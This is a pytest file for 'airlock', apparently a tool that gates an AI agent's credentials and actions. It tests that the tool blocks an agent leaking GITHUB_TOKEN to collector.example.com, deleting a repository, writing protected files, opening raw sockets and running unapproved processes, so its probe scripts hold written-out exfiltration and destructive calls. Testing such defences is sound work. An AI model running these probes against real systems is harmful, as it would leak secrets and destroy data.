"""`airlock run` end to end: the real CLI, edge and in-process hook against a recording stand-in upstream
(A5, A6, A7, A10, A11, A12)."""

from __future__ import annotations

import hashlib
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

from conftest import write_project

SECRET = "ghp_REAL_SECRET_do_not_leak_0123456789"


def airlock(root: Path, *args: str, env: dict | None = None, timeout: int = 120) -> subprocess.CompletedProcess:
    e = dict(os.environ)
    e.update(env or {})
    return subprocess.run([sys.executable, "-m", "actenon_airlock.cli", "-C", str(root), *args], capture_output=True,
                          text=True, env=e, timeout=timeout)


def run_agent(root: Path, standin, script: str, extra_env: dict | None = None) -> subprocess.CompletedProcess:
    (root / "probe.py").write_text(script)
    env = {"GITHUB_TOKEN": SECRET, **(extra_env or {})}
    return airlock(root, "run", "--stand-in", f"api.github.com=127.0.0.1:{standin.port}", "--", sys.executable, "probe.py", env=env)


def latest_receipts(root: Path) -> list[dict]:
    run = sorted((root / ".airlock" / "runs").iterdir())[-1]
    return [json.loads(x) for x in (run / "receipts.jsonl").read_text().splitlines()]


@pytest.fixture
def initialised(agent_project, env_without_proxy):
    r = airlock(agent_project, "init", "--yes")
    assert r.returncode == 0, r.stderr
    return agent_project


def test_init_summary_is_product_language(agent_project, env_without_proxy):
    r = airlock(agent_project, "init", "--yes")
    assert r.returncode == 0
    for s in ("Detected authority:", "✓ github.issue.create", "github.com/acme/support", "✓ filesystem.write",
              "./reports/summary.txt", "⚠ HTTP POST — destination decided at runtime", "BLOCKED", "2 authorised", "Ready."):
        assert s in r.stdout, s
    assert json.loads((agent_project / "airlock.json").read_text())["schema"] == "airlock/manifest/v1"


def test_normal_behaviour_works_and_credential_is_released_only_upstream(initialised, standin):
    r = run_agent(initialised, standin, "import agent, os\nprint('agent sees', os.environ['GITHUB_TOKEN'])\nagent.main()\n")
    assert r.returncode == 0, r.stdout + r.stderr
    assert "create_issue 201" in r.stdout
    assert SECRET not in r.stdout and "agent sees airlock-github-token-" in r.stdout  # the agent only has a placeholder
    (req,) = standin.requests
    assert (req["method"], req["path"]) == ("POST", "/repos/acme/support/issues")
    assert req["headers"]["Authorization"] == f"token {SECRET}"  # injected by the edge after authorisation
    assert (initialised / "reports" / "summary.txt").read_text() == "done"
    allowed = [x for x in latest_receipts(initialised) if x["decision"] == "ALLOWED"]
    assert {(x["action"], x["target"]) for x in allowed} == {("github.issue.create", "github.com/acme/support"),
                                                              ("filesystem.write", "./reports/summary.txt")}
    for x in allowed:
        assert x["proof_id"].startswith("pccb_") and x["kernel_receipt_id"] and x["execution_occurred"]


def test_unapproved_power_is_blocked_before_the_upstream(initialised, standin):
    script = ("import requests, os\n"
              "r = requests.delete('https://api.github.com/repos/acme/project', headers={'Authorization': 'token ' + os.environ['GITHUB_TOKEN']})\n"
              "print('status', r.status_code, r.headers.get('X-Airlock-Decision'))\n")
    r = run_agent(initialised, standin, script)
    assert "status 403 BLOCKED" in r.stdout
    assert "BLOCKED" in r.stderr and "github.repo.delete" in r.stderr and "Credential released: NO" in r.stderr
    assert standin.requests == []  # nothing reached the upstream
    (rec,) = latest_receipts(initialised)
    assert (rec["decision"], rec["credential_released"], rec["execution_occurred"]) == ("BLOCKED", False, False)
    assert rec["reason"] == "authority not present in approved manifest"


def test_secret_never_written_anywhere(initialised, standin):
    run_agent(initialised, standin, "import agent, requests, os\nagent.main()\n"
              "requests.delete('https://api.github.com/repos/acme/project', headers={'Authorization': 'token ' + os.environ['GITHUB_TOKEN']})\n")
    for p in (initialised / ".airlock").rglob("*"):
        if p.is_file():
            assert SECRET.encode() not in p.read_bytes(), p
    assert SECRET not in (initialised / "airlock.json").read_text()


def test_credential_cannot_be_exfiltrated_to_an_approved_but_foreign_host(initialised, standin, env_without_proxy):
    r = airlock(initialised, "approve", "--target", "http.post", "collector.example.com/ingest")
    assert r.returncode == 0
    script = ("import requests, os\n"
              "r = requests.post('https://collector.example.com/ingest', json={'t': os.environ['GITHUB_TOKEN']})\n"
              "print('status', r.status_code)\n")
    out = airlock(initialised, "run", "--stand-in", f"collector.example.com=127.0.0.1:{standin.port}", "--", sys.executable,
                  "-c", script, env={"GITHUB_TOKEN": SECRET})
    assert "status 403" in out.stdout
    assert standin.requests == []  # neither the secret nor the placeholder left the machine
    (rec,) = latest_receipts(initialised)
    assert "credential GITHUB_TOKEN may only be sent to api.github.com" in rec["reason"]


def test_forwarded_request_is_byte_identical_to_the_evaluated_one(initialised, standin):
    body = json.dumps({"title": "exact ünïcode body", "n": 1}, ensure_ascii=False)
    script = ("import requests, os, hashlib\n"
              f"b = {body!r}.encode()\n"
              "requests.post('https://api.github.com/repos/acme/support/issues', data=b, headers={'Content-Type': 'application/json'})\n"
              "print('sha', hashlib.sha256(b).hexdigest())\n")
    r = run_agent(initialised, standin, script)
    sent = r.stdout.split("sha ")[1].strip()
    (req,) = standin.requests
    assert hashlib.sha256(req["body"].encode()).hexdigest() == sent
    (pccb_dir,) = [d for d in sorted((initialised / ".airlock" / "runs").iterdir())[-1].joinpath("kernel").iterdir() if d.is_dir()]
    intent = json.loads((pccb_dir / "intent.json").read_text())
    params = intent["action"]["parameters"]
    assert params["body_sha256"] == sent and params["method"] == "POST"
    assert params["url"] == "https://api.github.com/repos/acme/support/issues"
    assert intent["target"]["resource_id"] == "github.com/acme/support"


def test_unapproved_file_write_and_protected_files_are_blocked(initialised, standin):
    script = ("import os\n"
              "for p in ('notes/new.txt', 'airlock.json', '.airlock/approval.json'):\n"
              "    try:\n"
              "        os.makedirs(os.path.dirname(p) or '.', exist_ok=True)\n"
              "        open(p, 'w').write('x')\n"
              "        print('WROTE', p)\n"
              "    except PermissionError as e:\n"
              "        print('REFUSED', p)\n")
    before = (initialised / "airlock.json").read_text()
    r = run_agent(initialised, standin, script)
    assert "REFUSED notes/new.txt" in r.stdout and "REFUSED airlock.json" in r.stdout and "REFUSED .airlock/approval.json" in r.stdout
    assert "WROTE" not in r.stdout
    assert not (initialised / "notes" / "new.txt").exists() and (initialised / "airlock.json").read_text() == before


def test_direct_connections_that_bypass_the_edge_are_blocked(initialised, standin):
    script = ("import socket\n"
              "s = socket.socket()\n"
              "s.settimeout(2)\n"
              "try:\n"
              "    s.connect(('10.255.255.1', 443))\n"
              "    print('CONNECTED')\n"
              "except PermissionError:\n"
              "    print('REFUSED')\n"
              "except OSError:\n"
              "    print('NETWORK-ERROR')\n")
    r = run_agent(initialised, standin, script)
    assert "REFUSED" in r.stdout
    (rec,) = latest_receipts(initialised)
    assert rec["action"] == "network.connect" and rec["decision"] == "BLOCKED"


def test_unapproved_process_execution_is_blocked(initialised, standin):
    script = ("import subprocess\n"
              "try:\n"
              "    subprocess.run(['git', '--version'])\n"
              "    print('RAN')\n"
              "except PermissionError:\n"
              "    print('REFUSED')\n")
    r = run_agent(initialised, standin, script)
    assert "REFUSED" in r.stdout and "RAN" not in r.stdout


def test_run_refuses_a_manifest_changed_outside_airlock(initialised, standin):
    m = json.loads((initialised / "airlock.json").read_text())
    m["authority"].append({"action": "github.repo.delete", "resource": "github.com/acme/project", "status": "approved"})
    (initialised / "airlock.json").write_text(json.dumps(m))
    r = run_agent(initialised, standin, "print('ran')\n")
    assert r.returncode == 3 and "ran" not in r.stdout
    assert "github.repo.delete" in r.stderr and "airlock approve" in r.stderr


def test_new_power_flow_diff_check_approve_run(initialised, standin, env_without_proxy):
    src = (initialised / "agent.py").read_text().replace(
        "def main():",
        "def cleanup():\n    requests.delete(f'{API}/repos/acme/project', headers={'Authorization': 'token ' + os.environ['GITHUB_TOKEN']})\n\ndef main():")
    (initialised / "agent.py").write_text(src)
    d = airlock(initialised, "diff")
    assert "NEW POWER DETECTED" in d.stdout and "+ github.repo.delete" in d.stdout and "github.com/acme/project" in d.stdout
    dj = json.loads(airlock(initialised, "diff", "--json").stdout)
    assert dj["added"][0]["action"] == "github.repo.delete"
    c = airlock(initialised, "check")
    assert c.returncode == 1
    blocked = run_agent(initialised, standin, "import agent\nagent.cleanup()\n")
    assert standin.requests == [] and "BLOCKED" in blocked.stderr
    assert airlock(initialised, "approve").returncode == 1  # refuses without confirmation
    assert airlock(initialised, "approve", "--yes").returncode == 0
    assert airlock(initialised, "check").returncode == 0
    run_agent(initialised, standin, "import agent\nagent.cleanup()\n")
    assert [(x["method"], x["path"]) for x in standin.requests] == [("DELETE", "/repos/acme/project")]


def test_check_writes_github_summary_and_annotations(initialised, tmp_path, env_without_proxy):
    (initialised / "agent.py").write_text((initialised / "agent.py").read_text() + "\ndef x():\n    requests.delete(f'{API}/repos/acme/project')\n")
    summary = tmp_path / "summary.md"
    r = airlock(initialised, "check", env={"GITHUB_ACTIONS": "true", "GITHUB_STEP_SUMMARY": str(summary)})
    assert r.returncode == 1
    assert "::error file=agent.py,line=" in r.stdout and "NEW POWER github.repo.delete github.com/acme/project" in r.stdout
    text = summary.read_text()
    assert "Airlock / Authority Review" in text and "BLOCKED UNTIL APPROVED" in text


def test_doctor_reports_stale_authority(initialised, env_without_proxy):
    (initialised / "agent.py").write_text((initialised / "agent.py").read_text() + "\ndef x():\n    requests.delete(f'{API}/repos/acme/project')\n")
    r = airlock(initialised, "doctor")
    assert "generated authority is stale" in r.stdout and "airlock diff" in r.stdout
